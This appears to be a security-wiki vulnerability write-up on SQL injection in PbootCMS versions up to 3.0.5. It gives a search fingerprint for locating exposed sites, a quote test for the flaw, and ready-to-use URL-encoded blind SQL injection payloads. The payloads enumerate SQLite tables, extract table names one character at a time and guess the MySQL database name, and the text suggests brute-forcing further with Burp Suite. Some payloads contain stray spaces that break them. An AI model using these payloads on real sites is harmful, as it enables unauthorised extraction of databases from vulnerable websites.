# PbootCMS domain SQL injection vulnerability

## Vulnerability Description

The PbootCMS search module has a SQL injection vulnerability. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">PbootCMS <= 3.0.5</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="PBOOTCMS"</span>

## Vulnerability reappears

Build the latest version locally and visit the homepage

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1629446682012-1df0a2c6-c764-4f1f-a5ae-cb85fd927b7e.png)

We need to visit an existing page

Add a single quote after 13 in the url '

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1629446712199-bb42a36a-69b2-485a-b0e6-0512f775cf45.png)

If the error is reported for execution of SQL, the vulnerability exists

If the following picture is displayed

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1629446812952-1dc35ab3-7379-424b-aad0-f8ad0629361c.png)

The vulnerability cannot be exploited

The program is built as a sqlite3 database by default, Fuzz the current database form payload

```plain
')%0aand%0a(SELECT%0acount(tbl_name)%0aFROM%0asqlite_master%0aWHERE%0atype%3d'ta ble'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%')<40--
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1629447097101-67648843-6711-4cbc-a2f2-dfa5f6aaa6f9.png)

Blind-in via this payload Is the total number of forms in the Fuzz database less than 40

The query is true and returns normal, and if false, an error is reported

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1629447283665-e890ddac-0cea-4447-a0ff-d42578145f93.png)

From this we can accurately infer the total number of forms

To calculate the length of the first table name in the sqlite database, we can use the following payload:

```plain
')%0aand%0a(SELECT%0alength(tbl_name)%0aFROM%0asqlite_master%0aWHERE%0atype%3d't able'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%'%0alimit%0a1%0aoffset%0a0)<8--
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1629447585595-c411c868-fcff-4361-8a84-84596245407a.png)

To guess the first table name, we can use the following payload:

```plain
')%0aand%0a(SELECT%0asubstr(tbl_name,1,1)%0aFROM%0asqlite_master%0aWHERE%0atype% 3d'table'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%'%0alimit%0a1%0aoffset%0a0)%3d'a'--
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1629447665612-0b0fe39d-b896-41d9-9904-cf760f2b516c.png)



Through the substr() function, we can easily get the table name.

Similarly, other data can be obtained

#### How to use it under Mysql

To guess the current database name, you can use the following payload for Fuzz:

```plain
')%0aand%0a(select%0asubstr(database(),1,1)%3d'p')%23
```

The page will return to normal when the query is true.

Use Burpsuite to burst out database names, other table names, field names, etc. The same methods include the same


</a-alert>
<br/>